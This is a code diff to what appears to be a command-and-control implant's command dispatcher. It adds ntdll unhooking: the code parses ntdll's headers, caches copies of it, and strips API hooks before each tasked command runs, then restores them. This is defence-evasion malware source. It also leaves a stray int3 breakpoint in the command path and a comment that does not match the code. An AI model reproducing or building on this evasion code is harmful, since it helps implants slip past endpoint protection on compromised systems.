@@ -33,6 +33,23 @@ VOID CommandDispatcher() {
     PVOID    DataBuffer  = NULL;
     SIZE_T   DataSize    = 0;
     DWORD    TaskCommand;
+#if CONFIG_UNHOOK == TRUE
+#if defined(CONFIG_ARCH) && (CONFIG_ARCH == 64)
+    PVOID p_ntdll = get_ntdll_64();
+#else
+    PVOID p_ntdll = get_ntdll_32();
+#endif //CONFIG_ARCH
+    IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) p_ntdll;
+    IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (p_ntdll + pDosHdr->e_lfanew);
+    IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
+
+    SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
+    // allocate local buffer to hold temporary copy of ntdll from remote process
+    LPVOID pCacheRestore = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
+    LPVOID pCacheClean = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
+
+    mem_cpy(pCacheRestore, p_ntdll, ntdll_size);
+#endif //unhook
 
     do {
         if(!Instance.Session.Connected) {
@@ -59,14 +76,15 @@ VOID CommandDispatcher() {
                     BOOL FoundCommand = FALSE;
                     for ( UINT32 FunctionCounter = 0; FunctionCounter < RVNT_COMMAND_LENGTH; FunctionCounter++ ) {
                         if ( Commands[FunctionCounter].ID == TaskCommand) {
+
                             // unhook
-                            HookingManager(TRUE);
+                            HookingManager(TRUE, pCacheClean, p_ntdll, ntdll_size);
 
                             // execute command
                             Commands[FunctionCounter].Function(&Parser);
-
+                            __asm("int3");
                             // rehook
-                            HookingManager(FALSE);
+                            HookingManager(FALSE, pCacheRestore, p_ntdll, ntdll_size);
                             FoundCommand = TRUE;
                             break;
                         }
